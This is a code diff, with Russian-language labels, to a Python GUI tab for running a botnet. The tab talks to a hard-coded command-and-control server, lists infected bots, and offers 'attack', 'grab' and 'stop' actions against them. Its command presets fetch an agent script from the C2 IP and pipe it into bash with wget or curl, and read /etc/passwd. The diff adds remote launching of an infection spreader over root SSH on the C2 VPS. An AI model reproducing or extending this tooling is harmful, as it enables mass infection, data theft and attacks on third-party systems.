@@ -4,8 +4,8 @@ import threading, socket, json, time, subprocess, os, re, requests
 from gui.widgets import RightClickMenu
 
 COMMAND_PRESETS = {
-    "wget -O- http://80.249.146.202/agent.sh | bash": "Загрузить и запустить агента (wget)",
-    "curl -s http://80.249.146.202/agent.sh | bash": "Загрузить и запустить агента (curl)",
+    "wget -O- http://80.249.146.202/agent_bash.sh | bash": "Загрузить и запустить агента (wget)",
+    "curl -s http://80.249.146.202/agent_bash.sh | bash": "Загрузить и запустить агента (curl)",
     "cat /etc/passwd": "Получить список пользователей",
     "whoami": "Текущий пользователь",
     "uname -a": "Информация о системе",
@@ -18,12 +18,12 @@ class BotnetTab(ttk.Frame):
         self.app = app
         self.c2_host = "80.249.146.202"
         self.c2_port = 80
+        self.vps_user = "root"
+        self.vps_pass = None
         self.spreader_process = None
         self.spreader_thread = None
         self.spreader_restart = True
         self.bots = {}
-        self.spread_total = 0
-        self.spread_current = 0
         self._last_fetch_error = 0
         self.my_ip = self._get_my_public_ip()
         self.create_widgets()
@@ -46,6 +46,7 @@ class BotnetTab(ttk.Frame):
         ctrl = ttk.Frame(bot_frame)
         ctrl.pack(fill=tk.X, padx=5, pady=5)
         ttk.Button(ctrl, text="Обновить список", command=self.refresh_bots).pack(side=tk.LEFT, padx=2)
+        ttk.Button(ctrl, text="Проверить всех", command=self.check_all_bots).pack(side=tk.LEFT, padx=2)
         ttk.Button(ctrl, text="Атака на выбранных", command=self.launch_attack).pack(side=tk.LEFT, padx=2)
         ttk.Button(ctrl, text="Граб выбранных", command=self.launch_grab).pack(side=tk.LEFT, padx=2)
         ttk.Button(ctrl, text="Стоп выбранных", command=self.stop_selected).pack(side=tk.LEFT, padx=2)
@@ -65,6 +66,7 @@ class BotnetTab(ttk.Frame):
         self.tree.tag_configure('online', foreground='#007700')
         self.tree.tag_configure('offline', foreground='#cc0000')
 
+        # Контекстное меню
         self.context_menu = tk.Menu(self.tree, tearoff=0)
         self.context_menu.add_command(label="Атака", command=self._ctx_attack)
         self.context_menu.add_command(label="Граб", command=self._ctx_grab)
@@ -87,7 +89,7 @@ class BotnetTab(ttk.Frame):
         spread_frame = ttk.Frame(notebook)
         notebook.add(spread_frame, text="Спредер")
         ttk.Label(spread_frame, text="Управление заражением", font=("Arial", 10, "bold")).pack(pady=5)
-        
+
         f = ttk.Frame(spread_frame)
         f.pack(pady=5)
         ttk.Label(f, text="Целей за цикл:").pack(side=tk.LEFT)
@@ -96,8 +98,8 @@ class BotnetTab(ttk.Frame):
         self.spin_count.pack(side=tk.LEFT, padx=5)
         self.local_var = tk.BooleanVar()
         ttk.Checkbutton(f, text="Локальная сеть", variable=self.local_var, command=self._on_local_changed).pack(side=tk.LEFT, padx=10)
-        self.btn_start_spread = ttk.Button(f, text="Запустить спредер", command=self.toggle_spreader)
-        self.btn_start_spread.pack(side=tk.LEFT, padx=10)
+        self.btn_start_vps = ttk.Button(f, text="Запустить на VPS", command=self.start_spreader_vps)
+        self.btn_start_vps.pack(side=tk.LEFT, padx=10)
         self.btn_check_c2 = ttk.Button(f, text="Проверить C2", command=self.check_c2_connection)
         self.btn_check_c2.pack(side=tk.LEFT, padx=10)
 
@@ -112,6 +114,7 @@ class BotnetTab(ttk.Frame):
         RightClickMenu(self.spread_log,
                        get_text_func=lambda: self.spread_log.selection_get() if self.spread_log.tag_ranges(tk.SEL) else self.spread_log.get("1.0", tk.END).strip())
 
+        # ===== Пользовательские команды =====
         cmd_frame = ttk.LabelFrame(self, text="Пользовательская команда")
         cmd_frame.pack(fill=tk.X, padx=5, pady=5)
         ttk.Label(cmd_frame, text="Выберите команду или введите свою:").grid(row=0, column=0, sticky='w', padx=5, pady=2)
@@ -166,7 +169,7 @@ class BotnetTab(ttk.Frame):
             self.cmd_entry.delete(0, tk.END)
             self.cmd_entry.insert(0, selected)
 
-    # ----- Проверка связи с C2 -----
+    # ----- Проверка C2 -----
     def check_c2_connection(self):
         def check():
             self.spread_log.insert(tk.END, "[*] Checking C2 connection...\n")
@@ -192,11 +195,15 @@ class BotnetTab(ttk.Frame):
     def refresh_bots(self):
         threading.Thread(target=self._fetch_bots, daemon=True).start()
 
+    def check_all_bots(self):
+        """Принудительно обновить список и вывести статус."""
+        self.refresh_bots()
+        messagebox.showinfo("Проверка", "Запрос отправлен. Статусы обновятся через несколько секунд.")
+
     def _fetch_bots(self):
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(60)
-            start = time.time()
+            sock.settimeout(30)
             sock.connect((self.c2_host, self.c2_port))
             sock.sendall(b"list\n")
             data = b""
@@ -205,8 +212,6 @@ class BotnetTab(ttk.Frame):
                 if not chunk:
                     break
                 data += chunk
-                if time.time() - start > 60:
-                    break
             sock.close()
             if not data:
                 raise Exception("empty response")
@@ -214,7 +219,7 @@ class BotnetTab(ttk.Frame):
             self.after(0, self._update_tree_safe, bots)
         except Exception as e:
             now = time.time()
-            if now - self._last_fetch_error > 30:
+            if now - self._last_fetch_error > 10:
                 self.spread_log.insert(tk.END, f"[!] Bot list update error: {e}\n")
                 self._last_fetch_error = now
 
@@ -228,8 +233,6 @@ class BotnetTab(ttk.Frame):
         total_rps = 0
         for bot in bots:
             ip = bot.get("ip")
-            if self.my_ip and ip == self.my_ip:
-                continue
             status = bot.get("status", "offline")
             tag = 'online' if status == 'online' else 'offline'
             values = (ip, bot.get("hostname",""), bot.get("os",""),
@@ -304,79 +307,29 @@ class BotnetTab(ttk.Frame):
             return
         self._send_custom_to_bots(cmd)
 
-    # ----- Спредер -----
+    # ----- Спредер на VPS -----
     def _on_local_changed(self):
-        if self.local_var.get():
-            self.spin_count.configure(state='disabled')
-        else:
-            self.spin_count.configure(state='normal')
+        pass
 
-    def toggle_spreader(self):
-        if self.spreader_process and self.spreader_process.poll() is None:
-            self.spreader_process.terminate()
-            self.btn_start_spread.config(text="Запустить спредер")
-            self.spread_log.insert(tk.END, "[*] Spreader stopped\n")
-            self.spread_progress_var.set(0)
-            self.lbl_spread_status.config(text="Stopped")
-            self.spreader_process = None
-            self.spreader_restart = False
-        else:
-            count = self.scale_var.get() if not self.local_var.get() else 254
-            mode = "local network" if self.local_var.get() else f"{count} random IPs"
-            self.spread_log.insert(tk.END, f"[*] Starting spreader, {mode}\n")
-            self.spread_progress_var.set(0)
-            self.lbl_spread_status.config(text="Initializing...")
-            self.spreader_restart = True
-            self.spreader_thread = threading.Thread(target=self._run_spreader, args=(count, self.local_var.get()), daemon=True)
-            self.spreader_thread.start()
-
-    def _run_spreader(self, count, local_mode=False):
-        while self.spreader_restart:
+    def start_spreader_vps(self):
+        count = self.scale_var.get()
+        if not self.vps_pass:
+            self.vps_pass = simpledialog.askstring("VPS пароль", f"Введите пароль для root@{self.c2_host}:", show='*')
+            if not self.vps_pass:
+                return
+        def run():
             try:
-                script_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', '..', 'botnet', 'spreader.py')
-                env = os.environ.copy()
-                env['PYTHONIOENCODING'] = 'utf-8'
-                cmd = ["python", "-u", script_path]
-                if local_mode:
-                    cmd.append("--local")
-                else:
-                    cmd += ["--count", str(count)]
-                self.spreader_process = subprocess.Popen(
-                    cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, env=env
-                )
-                self.btn_start_spread.config(text="Остановить спредер")
-                self.spread_total = count if not local_mode else 254
-                self.spread_current = 0
-                for line in iter(self.spreader_process.stdout.readline, ''):
-                    if not line:
-                        break
+                import paramiko
+                self.spread_log.insert(tk.END, f"[*] Подключаемся к VPS...\n")
+                client = paramiko.SSHClient()
+                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                client.connect(self.c2_host, username=self.vps_user, password=self.vps_pass, timeout=5)
+                cmd = f"cd /root/c2 && python3 -u spreader.py --count {count}"
+                stdin, stdout, stderr = client.exec_command(cmd)
+                for line in iter(stdout.readline, ""):
                     self.spread_log.insert(tk.END, line)
                     self.spread_log.see(tk.END)
-                    match = re.search(r'\[PROGRESS\]\s+(\d+)/(\d+)', line)
-                    if match:
-                        self.spread_current = int(match.group(1))
-                        self.spread_total = int(match.group(2))
-                        progress = (self.spread_current / self.spread_total) * 100
-                        self.after(0, self._update_spread_progress, progress, f"{self.spread_current}/{self.spread_total}")
-                rc = self.spreader_process.wait()
-                self.spreader_process = None
-                if rc != 0:
-                    self.spread_log.insert(tk.END, f"[!] Spreader exited with code {rc}\n")
-                if not self.spreader_restart:
-                    break
-                self.spread_log.insert(tk.END, "[*] Restarting spreader in 10 seconds...\n")
-                time.sleep(10)
+                client.close()
             except Exception as e:
-                import traceback
-                self.spread_log.insert(tk.END, f"[!] Spreader launch error:\n{traceback.format_exc()}\n")
-                self.spreader_process = None
-                if not self.spreader_restart:
-                    break
-                time.sleep(10)
-        self.btn_start_spread.config(text="Запустить спредер")
-        self.spread_progress_var.set(0)
-        self.lbl_spread_status.config(text="Ready")
-
-    def _update_spread_progress(self, value, text):
-        self.spread_progress_var.set(value)
-        self.lbl_spread_status.config(text=f"Scanning: {text}")
+                self.spread_log.insert(tk.END, f"[!] Ошибка VPS: {e}\n")
+        threading.Thread(target=run, daemon=True).start()
